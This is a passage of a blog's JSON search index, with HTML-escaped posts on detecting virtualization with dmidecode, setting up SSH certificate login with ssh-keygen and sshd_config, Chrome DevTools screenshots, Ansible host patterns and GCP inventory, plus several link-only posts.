工作站\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eroot@router:~# dmidecode -s system-product-name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eVMware Virtual Platform\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"虚拟盒子\"\u003e虚拟盒子\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eroot@router:~# dmidecode -s system-product-name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eVirtualBox\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"qemu-与-kvm\"\u003eQemu 与 KVM\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eroot@router:~# dmidecode -s system-product-name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eKVM\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eQemu（模拟）\u003c/p\u003e\n\u003ch4\u003e\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eroot@router:~# dmidecode -s system-product-name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eBochs\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"microsoft-虚拟-pc\"\u003eMicrosoft 虚拟 PC\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eroot@router:~# dmidecode | egrep -i \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;manufacturer|product\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eManufacturer: Microsoft Corporation\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eProduct Name: Virtual Machine\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"维尔图佐\"\u003e维尔图佐\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eroot@router:~# dmidecode\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e/dev/mem: Permission denied\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"en\"\u003een\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eroot@router:~# dmidecode | grep -i domU\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eProduct Name: HVM domU\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"devdiskby-id\"\u003e\u003ccode\u003e/dev/disk/by-id\u003c/code\u003e\u003c/h3\u003e\n\u003cp\u003e如果您没有 \u003ccode\u003edmidecode\u003c/code\u003e 运行权， 则可以使用： \u003ccode\u003els -1 /dev/disk/by-id/\u003c/code\u003e\u003c/p\u003e","tags":["URL","Virtualization","Linux"],"title":"确定虚拟化技术的简便方法"},{"categories":["URL","bayonet"],"contents":" [分享]鑰匙圈 - 五七步槍刺刀鞘的墬子 ","date":"July 10, 2020","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20200710-bayonet-rope/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.mobile01.com/topicdetail.php?f=637\u0026amp;t=282596\" target=\"_blank\" rel=\"noopener\"\u003e[分享]鑰匙圈 - 五七步槍刺刀鞘的墬子\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","bayonet"],"title":"[分享]鑰匙圈 - 五七步槍刺刀鞘的墬子"},{"categories":["URL","SSH","Linux"],"contents":" SSH 证书登录教程 证书登录的流程 SSH 证书登录之前，如果还没有证书，需要生成证书。具体方法是：\n用户和服务器都将自己的公钥，发给 CA CA 使用服务器公钥，生成服务器证书，发给服务器 CA 使用用户的公钥，生成用户证书，发给用户。 有了证书以后，用户就可以登录服务器了。整个过程都是 SSH 自动处理，用户无感知。\n用户登录服务器时，SSH 自动将用户证书发给服务器。 服务器检查用户证书是否有效，以及是否由可信的 CA 颁发。 SSH 自动将服务器证书发给用户。 用户检查服务器证书是否有效，以及是否由信任的 CA 颁发。 双方建立连接，服务器允许用户登录。 生成 CA 的密钥 虽然 CA 可以用同一对密码签发用户证书和服务器证书，但是出于安全性和灵活性，最好用不同的密钥分别签发。所以，CA 至少需要两对密钥，一对是签发用户证书的密钥，假设叫做 user_ca，另一对是签发服务器证书的密钥，假设叫做 host_ca。\n# 生成 CA 签发用户证书的密钥 # 会在~/.ssh目录生成一对密钥：user_ca（私钥）和user_ca.pub（公钥） # 各个参数含义如下 # -t rsa：指定密钥算法 RSA。 # -b 4096：指定密钥的位数是4096位。安全性要求不高的场合，这个值可以小一点，但是不应小于1024。 # -f ~/.ssh/user_ca：指定生成密钥的位置和文件名。 # -C user_ca：指定密钥的识别字符串，相当于注释，可以随意设置。 $ ssh-keygen -t rsa -b 4096 -f ~/.ssh/user_ca -C user_ca # 生成 CA 签发服务器证书的密钥 # 会在~/.ssh目录生成一对密钥：host_ca（私钥）和host_ca.pub（公钥） # 现在，~/.ssh目录应该至少有四把密钥。 # - ~/.ssh/user_ca # - ~/.ssh/user_ca.pub # - ~/.ssh/host_ca # - ~/.ssh/host_ca.pub $ ssh-keygen -t rsa -b 4096 -f host_ca -C host_ca 服务器安装 CA 公钥 # 为了让服务器信任用户证书，必须将 CA 签发用户证书的公钥`user_ca.pub`，拷贝到服务器 $ scp ~/.ssh/user_ca.pub root@host.example.com:/etc/ssh/ 然后，将下面一行添加到服务器配置文件 /etc/ssh/sshd_config TrustedUserCAKeys /etc/ssh/user_ca.pub 上面的做法是将user_ca.pub加到/etc/ssh/sshd_config，这会产生全局效果，即服务器的所有账户都会信任user_ca签发的所有用户证书。\n另一种做法 将user_ca.pub加到服务器某个账户的 ~/.ssh/authorized_keys 文件，只让该账户信任 user_ca 签发的用户证书。具体方法是打开 ~/.ssh/authorized_keys，追加一行，开头是 @cert-authority principals=\u0026quot;...\u0026quot;，然后后面加上 user_ca.pub 的内容\n@cert-authority principals=\u0026#34;user\u0026#34; ssh-rsa AAAAB3Nz...XNRM1EX2gQ== 上面代码中，principals=\u0026quot;user\u0026quot;指定用户登录的服务器账户名，一般就是authorized_keys文件所在的账户。\n$ sudo systemctl restart sshd CA 签发服务器证书 签发证书，除了 CA 的密钥以外，还需要服务器的公钥。一般来说，SSH 服务器（通常是 sshd）安装时，已经生成密钥 /etc/ssh/ssh_host_rsa_key 了。如果没有的话，可以用下面的命令生成。\n$ sudo ssh-keygen -f /etc/ssh/ssh_host_rsa_key -b 4096 -t rsa\n上面命令会在/etc/ssh 目录，生成 ssh_host_rsa_key（私钥）和 ssh_host_rsa_key.pub（公钥）。然后，需要把服务器公钥 ssh_host_rsa_key.pub，复制或上传到 CA 所在的服务器。\n# 上传以后，CA 就可以使用密钥 `host_ca` 为服务器的公钥 `ssh_host_rsa_key.pub` 签发服务器证书。 # 命令会生成服务器证书`ssh_host_rsa_key-cert.pub`（服务器公钥名字加后缀-cert）。这个命令各个参数的含义如下。 # -s：指定 CA 签发证书的密钥。 # -I：身份字符串，可以随便设置，相当于注释，方便区分证书，将来可以使用这个字符串撤销证书。 # -h：指定该证书是服务器证书，而不是用户证书。 # -n host.example.com：指定服务器的域名，表示证书仅对该域名有效。如果有多个域名，则使用逗号分隔。用户登录该域名服务器时，SSH 通过证书的这个值，分辨应该使用哪张证书发给用户，用来证明服务器的可信性。 # -V +52w：指定证书的有效期，这里为52周（一年）。默认情况下，证书是永远有效的。建议使用该参数指定有效期，并且有效期最好短一点，最长不超过52周。 # ssh_host_rsa_key.pub：服务器公钥。 $ ssh-keygen -s host_ca -I host.example.com -h -n host.example.com -V +52w ssh_host_rsa_key.pub $ chmod 600 ssh_host_rsa_key-cert.pub 服务器安装证书 # CA 生成服务器证书`ssh_host_rsa_key-cert.pub`以后，需要将该证书发回服务器，可以使用下面的scp命令，将证书拷贝过去 $ scp ~/.ssh/ssh_host_rsa_key-cert.pub root@host.example.com:/etc/ssh/ 然后，将下面一行添加到服务器配置文件 /etc/ssh/sshd_config 告诉 sshd，服务器证书是哪一个文件\nHostCertificate /etc/ssh/ssh_host_rsa_key-cert.pub $ sudo systemctl restart sshd CA 签发用户证书 # 将用户公钥`user_key.pub`，上传或复制到 CA 服务器。接下来，就可以使用 CA 的密钥 `user_ca` 为用户公钥`user_key.pub`签发用户证书 # 命令会生成用户证书 `user_key-cert.pub`（用户公钥名字加后缀-cert）。这个命令各个参数的含义如下。 # -s：指定 CA 签发证书的密钥 # -I：身份字符串，可以随便设置，相当于注释，方便区分证书，将来可以使用这个字符串撤销证书。 # -n user：指定用户名，表示证书仅对该用户名有效。如果有多个用户名，使用逗号分隔。用户以该用户名登录服务器时，SSH 通过这个值，分辨应该使用哪张证书，证明自己的身份，发给服务器。 # -V +1d：指定证书的有效期，这里为1天，强制用户每天都申请一次证书，提高安全性。默认情况下，证书是永远有效的。 # user_key.pub：用户公钥。 $ ssh-keygen -s user_ca -I user@example.com -n user -V +1d user_key.pub $ chmod 600 user_key-cert.pub 客户端安装证书 客户端安装用户证书很简单，就是从 CA 将用户证书 user_key-cert.pub 复制到客户端，与用户的密钥 user_key 保存在同一个目录即可。\n客户端安装 CA 公钥 为了让客户端信任服务器证书，必须将 CA 签发服务器证书的公钥 host_ca.pub，加到客户端的 /etc/ssh/ssh_known_hosts 文件（全局级别）或者 ~/.ssh/known_hosts 文件（用户级别）\n具体做法是打开 ssh_known_hosts 或 known_hosts 文件，追加一行，开头为@cert-authority *.example.com，然后将 host_ca.pub 文件的内容（即公钥）粘贴在后面，大概是下面这个样子。\n@cert-authority *.example.com ssh-rsa AAAAB3Nz...XNRM1EX2gQ== 上面代码中，*.example.com是域名的模式匹配，表示只要服务器符合该模式的域名，且签发服务器证书的 CA 匹配后面给出的公钥，就都可以信任。如果没有域名限制，这里可以写成*。如果有多个域名模式，可以使用逗号分隔；如果服务器没有域名，可以用主机名（比如 host1,host2,host3）或者 IP 地址（比如 11.12.13.14,21.22.23.24）。\n废除证书 服务器证书的废除，用户需要在 known_hosts 文件里面，修改或删除对应的@cert-authority 命令的那一行 用户证书的废除，需要在服务器新建一个/etc/ssh/revoked_keys文件，然后在配置文件sshd_config添加一行，内容如下 RevokedKeys /etc/ssh/revoked_keys $ ssh-keygen -kf /etc/ssh/revoked_keys -z 1 ~/.ssh/user1_key.pub 上面命令中，-z参数用来指定用户公钥保存在revoked_keys文件的哪一行，这个例子是保存在第 1 行 ","date":"July 8, 2020","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20200708-ssh-certificate/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.ruanyifeng.com/blog/2020/07/ssh-certificate.html\" target=\"_blank\" rel=\"noopener\"\u003eSSH 证书登录教程\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"证书登录的流程\"\u003e证书登录的流程\u003c/h3\u003e\n\u003cp\u003eSSH 证书登录之前，如果还没有证书，需要生成证书。具体方法是：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e用户和服务器都将自己的公钥，发给 CA\u003c/li\u003e\n\u003cli\u003eCA 使用服务器公钥，生成服务器证书，发给服务器\u003c/li\u003e\n\u003cli\u003eCA 使用用户的公钥，生成用户证书，发给用户。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e有了证书以后，用户就可以登录服务器了。整个过程都是 SSH 自动处理，用户无感知。\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e用户登录服务器时，SSH 自动将用户证书发给服务器。\u003c/li\u003e\n\u003cli\u003e服务器检查用户证书是否有效，以及是否由可信的 CA 颁发。\u003c/li\u003e\n\u003cli\u003eSSH 自动将服务器证书发给用户。\u003c/li\u003e\n\u003cli\u003e用户检查服务器证书是否有效，以及是否由信任的 CA 颁发。\u003c/li\u003e\n\u003cli\u003e双方建立连接，服务器允许用户登录。\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"生成-ca-的密钥\"\u003e生成 CA 的密钥\u003c/h3\u003e\n\u003cp\u003e虽然 CA 可以用同一对密码签发用户证书和服务器证书，但是出于安全性和灵活性，最好用不同的密钥分别签发。所以，CA 至少需要两对密钥，一对是签发用户证书的密钥，假设叫做 \u003ccode\u003euser_ca\u003c/code\u003e，另一对是签发服务器证书的密钥，假设叫做 \u003ccode\u003ehost_ca\u003c/code\u003e。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 生成 CA 签发用户证书的密钥\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 会在~/.ssh目录生成一对密钥：user_ca（私钥）和user_ca.pub（公钥）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 各个参数含义如下\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# -t rsa：指定密钥算法 RSA。\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# -b 4096：指定密钥的位数是4096位。安全性要求不高的场合，这个值可以小一点，但是不应小于1024。\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# -f ~/.ssh/user_ca：指定生成密钥的位置和文件名。\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# -C user_ca：指定密钥的识别字符串，相当于注释，可以随意设置。\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ ssh-keygen -t rsa -b \u003cspan style=\"color:#ae81ff\"\u003e4096\u003c/span\u003e -f ~/.ssh/user_ca -C user_ca\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 生成 CA 签发服务器证书的密钥\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 会在~/.ssh目录生成一对密钥：host_ca（私钥）和host_ca.pub（公钥）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 现在，~/.ssh目录应该至少有四把密钥。\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# - ~/.ssh/user_ca\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# - ~/.ssh/user_ca.pub\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# - ~/.ssh/host_ca\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# - ~/.ssh/host_ca.pub\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ ssh-keygen -t rsa -b \u003cspan style=\"color:#ae81ff\"\u003e4096\u003c/span\u003e -f host_ca -C host_ca\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"服务器安装-ca-公钥\"\u003e服务器安装 CA 公钥\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 为了让服务器信任用户证书，必须将 CA 签发用户证书的公钥`user_ca.pub`，拷贝到服务器\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ scp ~/.ssh/user_ca.pub root@host.example.com:/etc/ssh/\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"然后将下面一行添加到服务器配置文件-etcsshsshd_config\"\u003e然后，将下面一行添加到服务器配置文件 \u003ccode\u003e/etc/ssh/sshd_config\u003c/code\u003e\u003c/h5\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eTrustedUserCAKeys /etc/ssh/user_ca.pub\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e上面的做法是将\u003ccode\u003euser_ca.pub\u003c/code\u003e加到\u003ccode\u003e/etc/ssh/sshd_config\u003c/code\u003e，这会产生全局效果，即服务器的所有账户都会信任\u003ccode\u003euser_ca\u003c/code\u003e签发的所有用户证书。\u003c/p\u003e","tags":["URL","SSH","Linux"],"title":"SSH 证书登录教程"},{"categories":["URL","Chrome","ScreenShot"],"contents":" 如何使用 Chrome 開發人員工具擷取網頁畫面與製作長截圖？ 開啟 Chrome 開發人員工具 按下右上角的 more_vert，並選擇 filter_none 將它改成獨立視窗 Ctrl + Shift + P(Command + Shift + P) 輸入 screenshot Capture area screenshot：區域擷圖，選擇後你的滑鼠指標會變成 add，用它在網頁中框選出一個範圍即可擷圖。 Capture full size screenshot：長截圖，延遲一秒左右後將會自動完成擷圖，就是這麼簡單。 Capture node screenshot：節點擷圖，它類似長擷圖，但只有螢幕有顯示到的地方有影像，其餘都是空白。在文章後段我們會放預覽圖讓你比較一下差異。 Capture screenshot：普通擷圖，會自動擷取視窗看得到的網頁。如果剛剛沒有讓開發者工具變成獨立視窗的話，這邊的擷圖結果就會被影響。 ","date":"July 2, 2020","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20200702-howto-screenshot-page-by-chrome-devtools/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://tedliou.com/archives/howto-screenshot-page-by-chrome-devtools/\" target=\"_blank\" rel=\"noopener\"\u003e如何使用 Chrome 開發人員工具擷取網頁畫面與製作長截圖？\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003col\u003e\n\u003cli\u003e開啟 Chrome 開發人員工具\u003c/li\u003e\n\u003cli\u003e按下右上角的 more_vert，並選擇 filter_none 將它改成獨立視窗\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eCtrl + Shift + P\u003c/code\u003e(\u003ccode\u003eCommand + Shift + P\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003e輸入 \u003ccode\u003escreenshot\u003c/code\u003e\n\u003col\u003e\n\u003cli\u003eCapture area screenshot：區域擷圖，選擇後你的滑鼠指標會變成 add，用它在網頁中框選出一個範圍即可擷圖。\u003c/li\u003e\n\u003cli\u003eCapture full size screenshot：長截圖，延遲一秒左右後將會自動完成擷圖，就是這麼簡單。\u003c/li\u003e\n\u003cli\u003eCapture node screenshot：節點擷圖，它類似長擷圖，但只有螢幕有顯示到的地方有影像，其餘都是空白。在文章後段我們會放預覽圖讓你比較一下差異。\u003c/li\u003e\n\u003cli\u003eCapture screenshot：普通擷圖，會自動擷取視窗看得到的網頁。如果剛剛沒有讓開發者工具變成獨立視窗的話，這邊的擷圖結果就會被影響。\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003c/ol\u003e","tags":["URL","Chrome","ScreenShot"],"title":"如何使用 Chrome 開發人員工具擷取網頁畫面與製作長截圖？"},{"categories":["URL","Network","BIRD","BGP"],"contents":" BIRD 与 BGP 的新手开场 BIRD Internet Routing Daemon ","date":"June 22, 2020","hero":"/images/hero/network.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20200622-bird-bgp-kickstart/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://soha.moe/post/bird-bgp-kickstart.html\" target=\"_blank\" rel=\"noopener\"\u003eBIRD 与 BGP 的新手开场\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://gitlab.nic.cz/labs/bird\" target=\"_blank\" rel=\"noopener\"\u003eBIRD Internet Routing Daemon\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Network","BIRD","BGP"],"title":"BIRD 与 BGP 的新手开场"},{"categories":["URL","Git"],"contents":" Git 内部原理介绍 ","date":"June 2, 2020","hero":"/images/hero/git.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20200602-1369947/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://cloud.tencent.com/developer/article/1369947\" target=\"_blank\" rel=\"noopener\"\u003eGit 内部原理介绍\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Git"],"title":"Git内部原理介绍"},{"categories":["URL","Python"],"contents":" Python 玩转各种多媒体，视频、音频到图片 ","date":"May 31, 2020","hero":"/images/hero/python.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20200531-105371827/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.csdn.net/ZackSock/article/details/105371827\" target=\"_blank\" rel=\"noopener\"\u003ePython 玩转各种多媒体，视频、音频到图片\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Python"],"title":"Python玩转各种多媒体，视频、音频到图片"},{"categories":["Aliyun","Network","Cache","CDN"],"contents":"\n","date":"May 12, 2020","hero":"/images/hero/network.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20200512-aliyun-cdn-cache/","summary":"\u003cp\u003e\u003cimg src=\"/posts/2020/20200512-aliyun-cdn-cache/cache.png\" alt=\"\"\u003e\u003c/p\u003e","tags":["Aliyun","Network","Cache","CDN"],"title":"Aliyun CDN Cache Rules"},{"categories":["Ansible"],"contents":"# hosts 可以這樣寫 $ ansible \u0026#39;max-compute[!3:9][0:3][0:3]\u0026#39; -m setup --list-hosts hosts (4): max-compute10 max-compute13 max-compute20 max-compute23 $ ansible \u0026#39;max-compute[!3:9][0:4][0:4]\u0026#39; -m setup --list-hosts hosts (3): max-compute10 max-compute14 max-compute20 $ ansible \u0026#39;max-compute[!0:3]\u0026#39; -m setup --list-hosts hosts (6): max-compute4 max-compute5 max-compute6 max-compute7 max-compute8 max-compute9 plugin: gcp_compute projects: - project-XXX zones: - asia-east1-a - asia-east1-c - asia-east1-b - asia-east2-a - asia-east2-c - asia-east2-b auth_kind: serviceaccount service_account_file: /root/.ssh/sa001.json filters: - status=\u0026#34;RUNNING\u0026#34; hostnames: - name groups: nginx: \u0026#34;\u0026#39;nginx\u0026#39; in name\u0026#34; cassandra: \u0026#34;\u0026#39;cassandra\u0026#39; in name\u0026#34; redis: \u0026#34;\u0026#39;redis\u0026#39; in name\u0026#34; misc: \u0026#34;name in (\u0026#39;noc\u0026#39;, \u0026#39;mt-center\u0026#39;)\u0026#34; prod: \u0026#34;\u0026#39;prod\u0026#39; in name and \u0026#39;gke\u0026#39; not in name\u0026#34; all: \u0026#34;\u0026#39;gke\u0026#39; not in name\u0026#34; search: \u0026#34;\u0026#39;search\u0026#39; in name\u0026#34; cht_domain: \u0026#34;{{ \u0026#39;web.qat.cht\u0026#39; if ansible_default_ipv4[\u0026#39;network\u0026#39;] == \u0026#39;192.168.40.0\u0026#39; else \u0026#39;ap.qat.cht\u0026#39; if ansible_default_ipv4[\u0026#39;network\u0026#39;] == \u0026#39;192.168.50.0\u0026#39; else \u0026#39;db.qat.cht\u0026#39; if ansible_default_ipv4[\u0026#39;network\u0026#39;] == \u0026#39;192.168.60.0\u0026#39; else \u0026#39;qat.cht\u0026#39; }}\u0026#34; ","date":"May 12, 2020","hero":"/images/hero/ansible.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20200512-ansible-ad-hoc/","summary":"\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# hosts 可以這樣寫\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ ansible \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;max-compute[!3:9][0:3][0:3]\u0026#39;\u003c/span\u003e -m setup --list-hosts\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  hosts \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e4\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    max-compute10\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    max-compute13\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    max-compute20\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    max-compute23\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ ansible \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;max-compute[!3:9][0:4][0:4]\u0026#39;\u003c/span\u003e -m setup --list-hosts\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  hosts \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e3\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    max-compute10\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    max-compute14\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    max-compute20\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ ansible \u003cspan 